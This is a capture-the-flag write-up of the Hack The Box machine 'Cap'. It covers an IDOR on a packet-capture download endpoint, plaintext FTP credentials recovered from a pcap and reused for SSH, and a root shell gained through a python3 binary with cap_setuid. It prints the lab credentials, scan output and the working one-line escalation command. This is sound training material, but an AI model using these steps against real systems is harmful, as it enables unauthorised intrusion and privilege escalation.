---
machine: htb-cap
platform: HTB
os: Linux
difficulty: Easy
solved: 2026-10-22
time: 0.75
tags:
  - IDOR
  - Linux Capabilities
  - PCAP Analysis
  - FTP
takeaway: "Cap highlights the acute danger of exposing raw packet captures through unauthenticated endpoints vulnerable to IDOR. Inspecting historical pcap files reveals plaintext FTP authentication, granting instant user access. Furthermore, misconfigured Linux capabilities on interpreters like python3 allow trivial UID manipulation, transforming low-privilege access into a root shell without needing sudo or SUID binaries."
timeBreakdown:
  - [Reconnaissance and Web Enumeration, 15]
  - [Packet Analysis and Foothold, 15]
  - [Linux Capabilities Privilege Escalation, 15]
related:
  - htb-blue
---

## Summary

Cap is an easy-difficulty Linux machine on Hack The Box that demonstrates how an insecure direct object reference (IDOR) on an administrative dashboard can expose sensitive network traffic. The machine hosts a web-based security monitoring application that captures live network packets and makes them downloadable as PCAP files. By manipulating the numerical identifier in the download URL, I accessed an earlier capture file that contained unencrypted FTP credentials for the local user nathan. Using these credentials to authenticate via SSH yielded initial shell access. From there, local enumeration revealed that the python3 binary had been granted the cap_setuid capability, enabling an immediate elevation to root by setting the process UID to zero. I completed the machine in approximately 45 minutes from initial port scanning to reading both flags.

## Approach

My strategy followed a structured methodology: comprehensive host reconnaissance, web application endpoint analysis, credential recovery from packet captures, and local privilege escalation enumeration.

### Enumeration

I started by running an initial Nmap script and version scan across the target host to map active listening services:

```text
nmap -sVC -Pn -T3 10.129.86.181

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan revealed three open ports: FTP on port 21 running vsftpd 3.0.3, SSH on port 22, and an HTTP web server on port 80 powered by Gunicorn.

I first investigated the FTP service on port 21 to see if anonymous authentication was permitted, but the server rejected unauthenticated logins. Shifting attention to the web application on port 80, I discovered a dashboard titled Security Dashboard. The application mimics a lightweight network monitoring tool with navigation links for Security Snapshot, IP Config, and Network Status.

### Foothold

Clicking on the Security Snapshot menu triggered a 5-second packet capture and redirected to the URL `/data/1`. The page displayed a summary table of captured packets and provided a button to download the corresponding packet capture file (`1.pcap`).

Observing the numerical parameter in `/data/1`, I suspected an [API abuse](/techniques/api-abuse/) vulnerability where access control was not enforced between different capture sessions. I navigated directly to `/data/0` to check if historical captures were accessible. The dashboard returned a different set of packet statistics, confirming the insecure direct object reference.

I downloaded the capture file from `/download/0` and analyzed it in Wireshark. Because [network services](/techniques/network-services/) such as FTP transmit authentication in cleartext by default, I filtered the traffic for FTP packets. In stream 0, I identified plaintext FTP authentication commands:

```text
USER nathan
PASS Buck3tH4TF0RM3!
230 Login successful.
```

With recovered credentials for user `nathan`, I authenticated to the FTP server on port 21 and confirmed the user flag was located in the directory:

```text
ftp 10.129.86.181
Connected to 10.129.86.181.
220 (vsFTPd 3.0.3)
Name: nathan
331 Please specify the password.
Password: [Buck3tH4TF0RM3!]
230 Login successful.
ftp> ls
-r--------    1 1001     1001           33 Oct 22 10:50 user.txt
ftp> get user.txt
```

Because SSH was listening on port 22, I tested credential reuse and successfully established an interactive SSH session as `nathan`:

```text
ssh nathan@10.129.86.181
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
nathan@cap:~$ cat user.txt
[redacted]
```

### Privilege Escalation

After landing on the box, I began privilege escalation enumeration by testing for any [sudo misconfiguration](/techniques/sudo-misconfig/) using `sudo -l`, but user `nathan` had no sudo privileges on the machine. Searching for [SUID binaries](/techniques/linux-suid/) and auditing cron jobs also returned only standard system utilities.

I next audited POSIX capabilities with `getcap`:

```text
getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

The output revealed an unusual capability set on the Python binary: `/usr/bin/python3.8` had `cap_setuid` enabled. In Linux, [Linux capabilities](/techniques/linux-capabilities/) break down traditional root privileges into granular units. The `cap_setuid` capability permits an unprivileged process to arbitrarily alter its effective and real user IDs.

Because the Python binary possessed `cap_setuid`, I executed a one-line command to invoke `os.setuid(0)` and spawn a root Bash shell:

```text
nathan@cap:~$ python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# cat /root/root.txt
[redacted]
```

The shell immediately assumed UID 0, allowing me to retrieve the root flag and complete the machine.

## Key steps

1. Performed Nmap service scan discovering FTP (21), SSH (22), and HTTP (80).
2. Explored the web dashboard and identified an IDOR vulnerability on the `/data/<id>` packet capture endpoint.
3. Downloaded `0.pcap` from `/data/0` and extracted plaintext FTP credentials (`nathan:Buck3tH4TF0RM3!`) using Wireshark packet analysis.
4. Logged in via SSH with the captured credentials to claim the user flag.
5. Enumerated file capabilities with `getcap -r / 2>/dev/null` and found `cap_setuid` assigned to `/usr/bin/python3.8`.
6. Invoked `os.setuid(0)` via Python3 to gain an interactive root shell and retrieve the root flag.

## What I would do differently

In retrospect, I initially spent time looking for web application vulnerabilities in the Gunicorn dashboard itself before thoroughly inspecting the URL parameters. Recognizing numerical ID parameters in export and download routes immediately as prime candidates for IDOR would have saved 5 to 10 minutes during the reconnaissance phase.
